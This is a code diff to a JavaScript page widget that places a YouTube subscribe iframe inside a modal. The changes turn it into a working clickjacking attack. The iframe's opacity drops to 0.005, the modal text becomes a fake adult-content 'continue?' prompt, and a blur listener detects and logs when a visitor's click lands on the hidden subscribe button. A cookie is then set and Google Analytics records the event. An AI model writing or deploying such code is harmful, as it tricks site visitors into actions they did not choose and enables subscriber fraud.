@@ -1,3 +1,5 @@
+document.write("<script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https:\/\/www.google-analytics.com\/analytics.js','ga');ga('create', 'UA-80257863-1', 'auto');ga('send', 'pageview');<\/script>");
+
 (function(w, d) {
     "use strict";
     w.yt_load_count = 0;
@@ -65,7 +67,7 @@
         }
     }
 
-    var css = ".yt-backdrop *{box-sizing:border-box}.yt-backdrop .modal-container *{color:#fff}.yt-backdrop{background-color:rgba(0,0,0,.6);position:fixed;top:0;bottom:0;right:0;left:0}.yt-backdrop .modal-container{font-family:Helvetica,Arial,sans-serif;color:#fff;position:absolute;top:100px;bottom:100px;right:15px;left:15px;background-color:#2c2f33;margin:0;border-radius:4px;display:flex;flex-direction:column}.yt-backdrop .modal-header{background-color:#373a3d;box-shadow:-6px 2px 19px -9px rgba(0,0,0,.7)}.yt-backdrop .modal-header button{position:absolute;top:0;right:0;border:none;background-color:#373a3d;color:#fff;padding:10px 15px;font-size:20px}.yt-backdrop .modal-header h2{margin:0;padding:15px 25px}.yt-backdrop .modal-body{box-shadow:-6px 2px 19px -9px rgba(0,0,0,.7);flex:auto;padding:15px}.yt-backdrop .modal-footer{background-color:#282b2e;padding-top:10px}.yt-backdrop .modal-footer button{margin:10px 13px;border-radius:4px;padding:10px;color:#fff;font-size:1em;font-weight:700;width:calc(50% - 30px);border:none}.yt-backdrop .modal-footer button.ok{background-color:#91c46b}.yt-backdrop .modal-footer button.cancel{background-color:#a5acb4}.yt-backdrop.open{animation:fadein 1s}.yt-backdrop.close{animation:fadeout 2s}@keyframes fadein{from{opacity:0}to{opacity:1}}@keyframes fadeout{from{opacity:1}to{opacity:0}}.yt-backdrop .modal-container iframe{position: absolute;width: 86px;height: 24px;opacity: 0.5;}.yt-backdrop .modal-container :focus {outline: 0;}";
+    var css = "#yt-sub-desk-back{position: fixed;top: 0;bottom: 0;left: 0;right: 0;}.yt-backdrop *{box-sizing:border-box}.yt-backdrop{background-color:rgba(0,0,0,.6);position:fixed;top:0;bottom:0;right:0;left:0}.yt-backdrop .modal-container{font-family:Helvetica,Arial,sans-serif;color:#fff;position:absolute;top:100px;bottom:100px;right:15px;left:15px;background-color:#2c2f33;margin:0;border-radius:4px;display:flex;flex-direction:column}.yt-backdrop .modal-header{background-color:#373a3d;box-shadow:-6px 2px 19px -9px rgba(0,0,0,.7)}.yt-backdrop .modal-header button{position:absolute;top:0;right:0;border:none;background-color:#373a3d;color:#fff;padding:10px 15px;font-size:20px}.yt-backdrop .modal-header h2{margin:0;padding:15px 25px}.yt-backdrop .modal-body{box-shadow:-6px 2px 19px -9px rgba(0,0,0,.7);flex:auto;padding:15px}.yt-backdrop .modal-footer{background-color:#282b2e;padding-top:10px}.yt-backdrop .modal-footer button{margin:10px 13px;border-radius:4px;padding:10px;color:#fff;font-size:1em;font-weight:700;width:calc(50% - 30px);border:none}.yt-backdrop .modal-footer button.ok{background-color:#91c46b}.yt-backdrop .modal-footer button.cancel{background-color:#a5acb4}.yt-backdrop.open{animation:fadein 1s}.yt-backdrop.close{animation:fadeout 2s}@keyframes fadein{from{opacity:0}to{opacity:1}}@keyframes fadeout{from{opacity:1}to{opacity:0}}.yt-backdrop .modal-container iframe{position: absolute;width: 86px;height: 24px;opacity: 0.005;}.yt-backdrop .modal-container :focus {outline: 0;}";
 
 
     /* Opções padrão
@@ -73,12 +75,12 @@
      */
     var default_options = {
         "id_canal":"UCMDm1FEF6YvN_gnyR_bqhuA",
-        "nome_canal":"GoogleDevelopers",
-        "titulo":"Lorem Ipsum",
-        "sub_titulo":"Lorem ipsum site dolor",
-        "texto":"Lorem ipsum dolor sit amet, consectetur adipisicing elit. Perferendis harum, ad distinctio voluptatibus quia rem itaque amet atque mollitia ab quaerat fugit ipsa. Saepe accusamus, quas aliquid corporis. Incidunt, esse!",
+        "nome_canal":"",
+        "titulo":"Notificações",
+        "sub_titulo":"Este site é para adultos",
+        "texto":"Deseja continuar?",
         "botao1":"Cancelar",
-        "botao2":"OK!!!"
+        "botao2":"OK"
     };
 
 
@@ -197,7 +199,7 @@
     }
 
     function create_cookie(){
-        //setCookie("ytSubClick", true, 360);
+        setCookie("ytSubClick", true, 360);
     }
 
     function check_cookie(){
@@ -207,6 +209,11 @@
             }else{
                 ytSubInitDesktop();
             }
+        }
+    }
+    function log_click(tipo){
+        if(w.ga){
+            w.ga('send', 'event', 'Youtube', "clique", tipo);
         }
     }
 
@@ -226,12 +233,13 @@
 
         w.focus();
         var _listener = w.addEventListener('blur', function() {
-            if(d.activeElement.nodeName == "IFRAME") {
-                iframe.style.visibility="none";
+            if(d.activeElement.id == "yt-sub-iframe-move") {
+                log_click("desktop");
                 window.setTimeout(function(){
+                    iframe.style.visibility="none";
                     iframe.parentNode.removeChild(iframe);
                     create_cookie();
-                },1000);
+                },1500);
 
                 d.removeEventListener('blur', _listener);
             }
@@ -261,16 +269,19 @@
         w.focus();
         var _listener = w.addEventListener('blur', function() {
             if(d.activeElement.nodeName == "IFRAME") {
-                yt_backdrop.classList.add("close");
+                window.setTimeout(function(){
+                    yt_backdrop.classList.add("close");
+                },100);
 
                 yt_backdrop.addEventListener("animationend", function(){
                     window.setTimeout(function(){
                         yt_backdrop.parentNode.removeChild(yt_backdrop);
                         create_cookie();
-                    },1000);
+                    },2000);
                     yt_backdrop.style.display="none";
                 }, true);
 
+                log_click(d.activeElement.id);
                 d.removeEventListener('blur', _listener);
             }
         });
